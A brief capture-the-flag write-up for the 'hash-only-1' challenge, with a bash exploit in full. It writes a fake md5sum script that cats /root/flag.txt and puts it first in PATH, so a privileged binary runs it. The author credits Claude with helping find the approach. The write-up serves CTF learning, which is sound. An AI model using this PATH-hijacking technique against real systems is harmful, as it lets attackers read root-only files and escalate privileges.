## hash-only-1

I overcomplicated things again. I installed Ghidra to decompile the binary to see that it executes `/bin/bash -c 'md5sum /root/flag.txt'`.
While useful, my initial approach was to try and patch the binary (which doesn't work since we can't just edit the binary).

After debugging my approach with Claude, we found that a simple path manipulation was retrieve the flag. Basically, we pretend to be md5sum and get our malicious version executed instead.

```bash
echo '#!/bin/bash' > ~/md5sum
echo 'cat /root/flag.txt' >> ~/md5sum
chmod +x ~/md5sum

export PATH=~:$PATH

~/flaghasher
```

Thanks Claude.
